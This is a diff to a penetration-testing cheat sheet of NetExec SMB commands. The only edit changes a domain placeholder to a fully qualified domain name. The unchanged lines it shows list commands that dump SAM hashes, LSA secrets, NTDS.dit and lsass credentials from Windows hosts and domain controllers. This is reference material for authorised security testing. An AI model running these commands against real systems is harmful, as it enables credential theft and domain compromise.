@@ -76,7 +76,7 @@ nxc smb <ip> -u <user> -p '<password>' --local-groups
 Enumerate permissions on all shares
 
 ```bash
-nxc smb <ip> -u <user> -p <password> -d <domain> --shares
+nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> --shares
 ```
 
 ## spider shares
@@ -147,7 +147,7 @@ nxc smb <ip> -u <user> -H <nt_hash> --local-auth
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  
 
 ```bash
-nxc smb <ip> -u <user> -p <password> -d <domain>
+nxc smb <ip> -u <user> -p <password> -d <domain_fqdn>
 ```
 
 ## kerberos auth
@@ -167,7 +167,7 @@ Dump SAM hashes using methods from secretsdump.py
 You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account
 
 ```bash
-nxc smb <ip> -u <user> -p <password> -d <domain> --sam
+nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> --sam
 ```
 
 ## Dump LSA
@@ -177,7 +177,7 @@ Dump LSA secrets using methods from secretsdump.py
 Requires Domain Admin or Local Admin Privileges on target Domain Controller
 
 ```bash
-nxc smb <ip> -u <user> -p <password> -d <domain> --lsa
+nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> --lsa
 ```
 
 ## dump ntds.dit
@@ -187,14 +187,14 @@ Dump the NTDS.dit from target DC using methods from secretsdump.py
 Requires Domain Admin or Local Admin Privileges on target Domain Controller
 
 ```bash
-nxc smb <ip> -u <user> -p <password> -d <domain> --ntds
+nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> --ntds
 ```
 
 ## dump lsass
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER
 
 ```bash
-nxc smb <ip> -u <user> -p <password> -d <domain> -M lsassy
+nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> -M lsassy
 ```
 
 ## dump lsass - with bloodhond update
